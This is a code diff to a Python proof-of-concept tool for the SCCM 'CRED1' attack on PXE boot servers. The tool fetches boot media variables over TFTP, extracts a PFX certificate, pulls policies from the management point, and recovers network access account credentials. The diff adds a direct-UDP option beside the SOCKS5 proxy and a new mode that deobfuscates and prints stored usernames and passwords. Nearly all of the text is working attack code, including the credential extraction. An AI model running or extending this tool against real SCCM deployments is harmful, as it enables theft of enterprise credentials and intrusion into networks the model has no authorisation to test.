@@ -6,15 +6,15 @@ import struct
 import xml.etree.ElementTree as ET
 
 # Parse arguments
-parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
+parser = argparse.ArgumentParser(description="SCCM CRED1 POC")
 subparsers = parser.add_subparsers(dest="mode", required=True)
 
 # Attack mode
 attack_parser = subparsers.add_parser("attack", help="Run the CRED1 attack against a PXE server")
 attack_parser.add_argument("target", help="SCCM PXE IP")
 attack_parser.add_argument("src_ip", help="Source IP")
-attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
-attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
+attack_parser.add_argument("socks_host", nargs="?", default=None, help="SOCKS5 proxy host (omit for direct UDP)")
+attack_parser.add_argument("socks_port", nargs="?", default=None, type=int, help="SOCKS5 proxy port (omit for direct UDP)")
 attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
 attack_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
 
@@ -30,12 +30,12 @@ hash_parser.add_argument("file", help="Path to the .boot.var file")
 
 # Loot mode — extract PFX and info from already-decrypted XML
 loot_parser = subparsers.add_parser("loot", help="Extract PFX cert and info from decrypted media variables XML")
-loot_parser.add_argument("xml_file", help="Path to decrypted media variables XML file")
+loot_parser.add_argument("xml_file", help="Path to decrypted media variables XML (produced by 'attack' or 'decrypt' modes)")
 loot_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
 
 # Policies mode — retrieve and decrypt policies from MP using PFX cert
-policies_parser = subparsers.add_parser("policies", help="Retrieve policies from MP using PFX cert (extracts NAA creds)")
-policies_parser.add_argument("xml_file", help="Path to variables.xml (decrypted media variables XML)")
+policies_parser = subparsers.add_parser("policies", help="Retrieve policies from MP using PFX cert (extracts NAA creds, task sequences)")
+policies_parser.add_argument("xml_file", help="Decrypted media variables XML containing PFX cert (e.g. ./loot/variables.xml or sccm.xml)")
 policies_parser.add_argument("-o", "--output", help="Output directory for policy files", type=str, default="./loot")
 policies_parser.add_argument("--mp", help="Override management point URL", type=str, default=None)
 policies_parser.add_argument(
@@ -50,14 +50,24 @@ policies_parser.add_argument(
     default=None,
 )
 
+# Deobfuscate mode — deobfuscate credential strings from NAAConfig.xml or raw hex
+deobfuscate_parser = subparsers.add_parser("deobfuscate", help="Deobfuscate SCCM secret='1' credential blobs from policy XML or raw hex")
+deobfuscate_parser.add_argument("input", help="Path to NAAConfig.xml file, or a raw hex credential string (8913...)")
+
 # Local policies mode — decrypt already downloaded .raw policy blobs
 policies_local_parser = subparsers.add_parser(
     "policies-local",
-    help="Decrypt local policy .raw blobs using PFX from media XML",
+    help="Decrypt local .raw policy blobs offline (no network required)",
 )
-policies_local_parser.add_argument("xml_file", help="Path to variables.xml (decrypted media variables XML)")
 policies_local_parser.add_argument(
-    "-i", "--input", help="Directory containing NAAConfig.raw/TaskSequence_*.raw", type=str, default="./loot"
+    "xml_file",
+    help="Decrypted media variables XML containing PFX cert (e.g. ./loot/variables.xml or sccm.xml). "
+         "This is the XML produced by 'attack' or 'decrypt' modes — NOT the raw .boot.var file.",
+)
+policies_local_parser.add_argument(
+    "-i", "--input",
+    help="Directory containing .raw policy blobs (NAAConfig.raw, TaskSequence_*.raw, CollectionSettings.raw)",
+    type=str, default="./loot",
 )
 policies_local_parser.add_argument("-o", "--output", help="Output directory for decrypted policy files", type=str, default="./loot")
 
@@ -147,6 +157,31 @@ if args.mode == "decrypt":
         print(f"[!] Decryption failed: {e}")
     exit()
 
+if args.mode == "deobfuscate":
+    from lib import sccm
+    sccm_client = sccm.SCCM(None, None, None)
+
+    # Check if input is a file path or raw hex string
+    if os.path.isfile(args.input):
+        with open(args.input, "r") as f:
+            xml_text = f.read()
+        print(f"[*] Parsing NAAConfig XML: {args.input}")
+        results = sccm_client.deobfuscate_naa_xml(xml_text)
+        if not results:
+            print("[!] No CCM_NetworkAccessAccount instances found in XML")
+        for i, (username, password) in enumerate(results):
+            print(f"[*] NAA Instance {i}:")
+            print(f"[!]   Username: {username!r}" if username else "[!]   Username: (empty)")
+            print(f"[!]   Password: {password!r}" if password else "[!]   Password: (empty)")
+    else:
+        # Treat as raw hex credential string
+        try:
+            plaintext = sccm_client.deobfuscate_credential_string(args.input)
+            print(f"[!] Deobfuscated: {plaintext}")
+        except Exception as e:
+            print(f"[!] Failed to deobfuscate: {e}")
+    exit()
+
 if args.mode == "hash":
     try:
         with open(args.file, "rb") as f:
@@ -163,16 +198,27 @@ if args.mode == "hash":
     exit()
 
 # Attack mode
-if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
-    print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
+if args.target == None or args.src_ip == None:
+    print("Usage: python3 main.py attack <target> <src_ip> [socks_host] [socks_port]")
     exit()
+
+if (args.socks_host is None) != (args.socks_port is None):
+    print("[!] Both socks_host and socks_port must be provided together, or omit both for direct UDP")
+    exit()
+
+use_socks = args.socks_host is not None
 
 # Attack-only imports (scapy-dependent)
 from lib import sccm
 from lib import socks, tftp
 
-# Setup SOCKS5 client
-client = socks.SOCKS5Client(args.socks_host, args.socks_port)
+def make_client():
+    if use_socks:
+        return socks.SOCKS5Client(args.socks_host, args.socks_port)
+    return socks.DirectUDPClient()
+
+# Setup client
+client = make_client()
 client.connect()
 
 sccm_client = sccm.SCCM(args.target, 4011, client)
@@ -184,7 +230,7 @@ print(f"[*] BCD file: {bcd}")
 client.close()
 
 # Download the variables file via TFTP
-client = socks.SOCKS5Client(args.socks_host, args.socks_port)
+client = make_client()
 client.connect()
 
 tftp_client = tftp.TFTPClient(args.target, 69, client)
